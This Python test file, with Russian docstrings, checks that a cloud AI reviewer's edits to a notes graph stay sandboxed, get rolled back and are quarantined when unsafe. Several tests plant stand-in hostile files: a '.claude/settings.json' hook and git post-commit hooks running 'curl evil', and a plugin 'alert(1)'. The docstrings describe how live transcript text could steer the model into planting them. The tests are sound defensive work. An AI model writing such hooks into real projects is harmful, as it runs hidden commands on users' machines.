    маску: лог и .partial — 0600 (Codex, Important круг-1 по #381)."""
    import ast
    src = (REPO / "scripts" / "cloud_review.py").read_text(encoding="utf-8")
    main = next(n for n in ast.walk(ast.parse(src))
                if isinstance(n, ast.FunctionDef) and n.name == "main")
    assert any(isinstance(n, ast.Attribute) and n.attr == "harden_umask"
               for n in ast.walk(main))


def _meeting(tmp_path, stamp="2026-07-15_1400"):
    transcripts = tmp_path / "transcripts"; transcripts.mkdir(exist_ok=True)
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    return transcript, transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"


_REPORT = ("- **Решение:** оставить граф закрытым\n"
           "- **Поручение:** проверить настройку\n"
           "- **Риск:** файловый доступ не выдавался\n")


def test_graph_gone_while_waiting_for_the_lock_means_text_only(tmp_path, monkeypatch):
    """graph_available считался ДО ожидания замка: исчезнувший граф давал
    Edit при cwd=папка стенограмм (круг-2 по #381, Codex Critical)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    captured = {}
    avail = iter([True, False])          # до замка — есть, под замком — нет
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
                        lambda g: next(avail, False))

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"], captured["cwd"] = cmd, kwargs["cwd"]
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    cmd = captured["cmd"]
    assert cmd[cmd.index("--tools") + 1] == "" and "--allowedTools" not in cmd
    assert "только текст" in log.read_text(encoding="utf-8")
    assert not (graph / "Встречи-архив").exists(), "доставка в исчезнувший граф"


def test_check_and_rollback_survive_an_unwritable_log(tmp_path, monkeypatch):
    """Сверка стояла за log.open в finally — лог без прав отменял откат
    (круг-2 по #381, DS + Codex Critical)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
         / f"{stamp}.md").write_text("переписано облаком", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        log.unlink(); log.parent.joinpath("cloud.log").mkdir()   # лог стал каталогом
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert doc.read_text(encoding="utf-8") == "стенограмма\n", (
        "запрещённая правка перенесена в граф, хотя лог недоступен"
    )


def test_unreadable_subfolder_downgrades_to_read_only(tmp_path, monkeypatch):
    """os.walk молча пропускал нечитаемый подкаталог: список запретов и
    снимок становились неполными (круг-2 по #381, Codex)."""
    import os
    graph = _graph(tmp_path)
    closed = graph / "Закрытое"; closed.mkdir()
    (closed / ".secret.md").write_text("x", encoding="utf-8")
    os.chmod(closed, 0o000)
    try:
        import pytest
        with pytest.raises(OSError):
            cloud_review.deny_paths(graph)
    finally:
        os.chmod(closed, 0o700)
    assert dict(cloud_review.deny_paths(graph)).get("Закрытое/.secret.md") is False


def test_failed_check_blocks_delivery_and_returns_error(tmp_path, monkeypatch):
    """Неполная сверка (Verdict.failed) — не повод доставлять ревизию в
    защищённые папки (круг-2 по #381, Codex)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
         / f"{stamp}.md").write_text("переписано", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "quarantine",
                        lambda *a, **k: (_ for _ in ()).throw(OSError(28, "ENOSPC")))
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
    assert rev.exists(), "ревизия всё равно сохранена рядом со стенограммой"
    assert not (graph / "Встречи-архив").exists(), "доставлено после неполного переноса"
    assert "ПЕРЕНОС НЕ СМОГ" in log.read_text(encoding="utf-8")


def test_quarantine_rotation_spares_the_current_run(tmp_path):
    root = tmp_path / "q"
    for s in ("2026-08-01_1000-1", "2026-08-02_1000-1", "2026-08-03_1000-1"):
        (root / s).mkdir(parents=True)
    current = root / "2026-07-01_0900-1"          # старая встреча разобрана сегодня
    current.mkdir()
    cloud_review.rotate_quarantine(root, keep=2, current=current)
    assert current.exists()
    assert sorted(p.name for p in root.iterdir()) == [
        "2026-07-01_0900-1", "2026-08-02_1000-1", "2026-08-03_1000-1"]


def test_delivery_does_not_depend_on_the_log_and_quarantine_names_the_stem(tmp_path, monkeypatch):
    """Недоступный лог не отменяет доставку опубликованной ревизии; каталог
    карантина — по точному стему стенограммы (круг-3 по #381)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path, stamp + "30")
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
         / f"{stamp}.md").write_text("переписано", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        log.unlink(); log.mkdir()
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    assert doc.read_text(encoding="utf-8") == "стенограмма\n"
    assert (graph / "Документация" / "Стенограммы встреч" / rev.name).exists(), "доставка не состоялась"
    runs = [p.name for p in cloud_review.quarantine_root(graph).iterdir()]
    assert len(runs) == 1 and runs[0].startswith(stamp + "30-"), runs


def test_a_failed_review_leaves_the_neighbouring_meeting_alone(tmp_path, monkeypatch):
    """Провал ревизии не касается ни своей встречи, ни соседней.

    27.08 вживую: облачная ревизия встречи 10:32 упала по таймауту, откат
    вернул граф к снимку и унёс заметку самой встречи вместе с пятью
    артефактами встречи 11:33, разобранной сорока минутами позже. Замок графа
    облако держит все тридцать минут, конвейер его не берёт и пишет рядом, а
    «изменилось с момента снимка» своё от чужого не отличает.

    Отличать пытались шестью признаками (штамп в имени, оригинал в
    transcripts, подпись писателя, окно работы конвейера, скрытость,
    исполняемость) — каждый ловил Critical на краевом случае. №120 убирает
    сам вопрос: облако работает в своей копии, конвейер — в графе, и
    пересечься они могут только в одном файле, где побеждает конвейер.
    """
    graph = _graph(tmp_path)
    monkeypatch.setattr(cloud_review, "ROOT", tmp_path / "data")
    old_node = graph / "Ядра" / "Хранилище.md"
    old_node.parent.mkdir(parents=True, exist_ok=True)
    old_node.write_text("# ядро\nстарый текст\n", encoding="utf-8")

    mine = graph / "Встречи" / "2026-08-27_1032.md"
    neighbour = graph / "Встречи" / "2026-08-27_1133.md"
    docs = graph / "Документация" / "Стенограммы встреч"
    artefacts = [docs / f"2026-08-27_1133_Статус{tail}.md"
                 for tail in ("", "_live", "_minutes", "_hints", "_разбор")]

    def worked(pen):
        # конвейер за это время разобрал соседнюю встречу — в графе
        mine.parent.mkdir(parents=True, exist_ok=True)
        mine.write_text("# наша встреча\n", encoding="utf-8")
        neighbour.write_text("# соседняя встреча\n", encoding="utf-8")
        docs.mkdir(parents=True, exist_ok=True)
        for f in artefacts:
            f.write_text("артефакт\n", encoding="utf-8")
        # а облако успело переписать ядро — у себя в копии
        (pen / "Ядра" / "Хранилище.md").write_text(
            "# ядро\nоблачный текст\n", encoding="utf-8")

    qdir = tmp_path / "q"
    before = cloud_review.snapshot(graph)
    backup = cloud_review.backup_graph(graph, "снимок")
    pen = cloud_review.backup_graph(graph, "песочница")
    worked(pen)
    # ответ невалиден — ровно случай 27.08
    v = cloud_review.apply_from_copy(before, pen, graph, qdir,
                                     backup=backup, valid=False)

    assert mine.is_file() and neighbour.is_file(), "заметки встреч исчезли"
    assert all(f.is_file() for f in artefacts), "артефакты соседней встречи исчезли"
    assert old_node.read_text(encoding="utf-8") == "# ядро\nстарый текст\n", (
        "правка облака дошла до графа при невалидном ответе"
    )
    assert v.touched == 1, "перенос увидел чужую работу вместо правок облака"
    assert (qdir / "Ядра" / "Хранилище.md").read_text(encoding="utf-8") == (
        "# ядро\nоблачный текст\n"), "работа облака не сохранена для человека"

def test_anything_executable_planted_in_a_dot_folder_is_taken_away(tmp_path):
    """В скрытом каталоге файл значит исполнение, а не заметку.

    Круг-10, GLM Critical: сузив зону до `.obsidian`, я объявил все прочие
    скрытые каталоги «нашими бэкапами» — а в графе живут ещё `.git`,
    `.claude`, `.config`. Стенограмму диктует живая встреча, то есть текст
    в неё может попасть чей угодно; `.claude/settings.json` с hook —
    исполнение команды в следующей же сессии CLI. Второй слой существует
    ровно потому, что первому не доверяют, и созданного во время окна
    каталога у deny-правил нет.
    """
    graph = _graph(tmp_path)
    rels = (".obsidian/plugins/x/main.js", ".claude/settings.json",
            ".git/hooks/post-commit")

    def worked(pen):
        for rel, body in zip(rels, ("alert(1)", '{"hooks": {"Stop": "curl evil"}}',
                                    "#!/bin/sh\ncurl evil")):
            f = pen / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(body, encoding="utf-8")
            if f.parent.name == "hooks":
                f.chmod(0o755)   # git-хук опасен ровно с битом исполнения

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    for rel in rels:
        assert not (graph / rel).exists(), f"подложенное {rel} перенесено в граф"
        assert rel in v.removed
        assert any(qdir.rglob(pathlib.Path(rel).name)), "убранное обязано быть в карантине"
    assert not v.applied, "исполняемое не переносится ни при каких условиях"


def test_a_dot_file_that_nobody_executes_stays_where_it_is(tmp_path):
    """Скрытость — не признак опасности и не признак авторства.

    Круг-11, GLM и Codex: правило «всё скрытое — в карантин» захватывало
    мусор macOS и iCloud, бэкапы конвейера в чужих подпапках и файлы самого
    владельца, а ротация карантина уничтожала бы их через десяток разборов.
    Проверяем именно то, что раньше уносило: неисполняемое остаётся.
    """
    graph = _graph(tmp_path)
    rels = ("Встречи/.DS_Store", "Ядра/.tier3_backup/2026-07-15/Х.md",
            ".forget_backup/2026-07-15/Встречи/В.md", "Люди/.заметка.md",
            "Досье/.backup/2026-07-15/Д.md")

    def worked(pen):
        # Тихие файлы пишет КОНВЕЙЕР и владелец — то есть в граф, пока
        # облако работает в песочнице. С №120 этого достаточно: перенос
        # ходит по правкам песочницы и о них попросту не знает.
        for rel in rels:
            f = graph / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("тихий файл\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nобогатило облако\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert all((graph / rel).is_file() for rel in rels), "унесено чужое"
    assert not v.removed and v.applied == ["Встречи/2026-07-15_1400.md"]


def test_a_backup_name_deep_in_a_stranger_folder_is_no_pass(tmp_path):
    """Имя бэкапа в середине пути не делает файл нашим.

    Круг-11, Codex: allow-list смотрел на любой компонент, и путь вида
    `Чужое/.backup/.git/hooks/post-commit` проходил как бэкап конвейера.
    Теперь решает зона исполнения, а она проверяется от корня графа.
    """
    graph = _graph(tmp_path)
    sneaky = graph / ".claude" / ".backup" / "settings.json"
    # И тот самый путь из докстринга: зона исполнения на глубине, а не у корня.
    deep = graph / "Чужое" / ".backup" / ".git" / "hooks" / "post-commit"
    upper = graph / ".obsidian" / "Plugins" / "x" / "main.js"

    def worked(pen):
        for rel, body in ((".claude/.backup/settings.json",
                           '{"hooks": {"Stop": "curl evil"}}'),
                          ("Чужое/.backup/.git/hooks/post-commit",
                           "#!/bin/sh\ncurl evil"),
                          # регистр каталога не должен ничего менять
                          (".obsidian/Plugins/x/main.js", "alert(1)")):
            f = pen / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(body, encoding="utf-8")
            if f.parent.name == "hooks":
                f.chmod(0o755)     # git запускает только исполняемый хук

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert not sneaky.exists(), "имя бэкапа внутри .claude пропустило hook"
    assert not deep.exists(), "git-хук в подпапке перенесён в граф"
    assert not upper.is_file(), "каталог Plugins с заглавной выпал из снимка"
    assert len(v.removed) == 3 and not v.applied
    assert all(any(qdir.rglob(f.name)) for f in (sneaky, deep, upper))



def test_the_pipelines_own_backups_are_not_swept_out_with_the_hidden_folders(tmp_path):
    """Скрытый каталог — ещё не чужой: в трёх таких пишет сам конвейер.

    Круг-9, GLM Critical: правило «созданное в скрытой зоне — в карантин»
    выносило из графа `Ядра/.tier3_backup` (tier3 снимает копию ядра на
    каждой встрече, src/tier3.py:167) и `.forget_backup` (забывание встречи).
    Это штатные пути восстановления, а ротация карантина стёрла бы их
    насовсем через десяток разборов — потеря с задержкой.
    """
    graph = _graph(tmp_path)
    ours = [graph / rel for rel in
            ("Ядра/.tier3_backup/2026-07-15_1500/Хранилище.md",
             ".forget_backup/2026-07-15_1500/Встречи/2026-07-15_1500.md",
             "Ядра/.tier3_backup/2026-07-15_1500/Доставка.md")]

    def worked(pen):
        # tier3 и забывание пишут в ГРАФ, пока облако сидит в песочнице.
        for f in ours:
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("копия до правки\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert all(f.is_file() for f in ours), "бэкапы конвейера унесены в карантин"
    assert not v.removed, f"из графа вынесено: {v.removed}"


def test_gits_own_sample_hooks_are_not_swept_away(tmp_path):
    """Вложенный репозиторий в графе не должен терять свои хуки.

    Круг-13, DS и GLM: зона `.git/hooks` на любой глубине забирала штатные
    `*.sample` от `git clone` и хуки от `pre-commit install`, если те
    появились в получасовое окно ревизии. Git запускает хук только с битом
    исполнения, а `Write` облака его не ставит — по нему и различаем.
    """
    graph = _graph(tmp_path)
    hooks = graph / "проект" / ".git" / "hooks"
    sample = hooks / "pre-commit.sample"
    live = hooks / "pre-commit"

    def worked(pen):
        # git clone и `pre-commit install` кладут хуки в ГРАФ, а не в
        # песочницу: с изоляцией их судьба переносу неинтересна вовсе, и
        # различать «наш хук или подложенный» больше не нужно (№120 снял
        # признак, который до этого пять раз ломался).
        hooks.mkdir(parents=True, exist_ok=True)
        sample.write_text("#!/bin/sh\nexit 0", encoding="utf-8")
        sample.chmod(0o755)
        live.write_text("#!/bin/sh\npre-commit run", encoding="utf-8")
        live.chmod(0o755)
        # а вот это уже облако — в свою копию, и в граф оно не попадёт
        planted = pen / "проект" / ".git" / "hooks" / "post-commit"
        planted.parent.mkdir(parents=True, exist_ok=True)
        planted.write_text("#!/bin/sh\ncurl evil", encoding="utf-8")
        planted.chmod(0o755)

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert sample.is_file() and live.is_file(), "хуки репозитория унесены"
    assert not (hooks / "post-commit").exists(), "хук облака перенесён в граф"
    assert v.removed == ["проект/.git/hooks/post-commit"]
    assert any(qdir.rglob("post-commit")), "убранное обязано быть в карантине"


